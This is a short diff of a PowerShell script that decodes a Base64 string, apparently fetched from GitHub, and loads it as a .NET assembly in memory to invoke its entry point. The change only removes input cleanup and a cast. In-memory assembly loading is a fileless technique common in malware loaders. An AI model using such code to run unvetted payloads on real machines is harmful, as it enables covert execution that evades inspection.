@@ -12,9 +12,7 @@ function Decode-Base64 {
     param (
         [string]$base64
     )
-    # Nettoyer le Base64 (GitHub peut ajouter des retours à la ligne)
-    $cleanBase64 = $base64.Trim() -replace '\s', ''
-    $bytes = [Convert]::FromBase64String($cleanBase64)
+    $bytes = [Convert]::FromBase64String($base64)
     return $bytes
 }
 
@@ -23,7 +21,7 @@ function Execute-InMemory {
         [byte[]]$bytes
     )
 
-    $assembly = [System.Reflection.Assembly]::Load([byte[]]$bytes)
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
 
     $entryPoint = $assembly.EntryPoint
     if ($entryPoint -ne $null) {
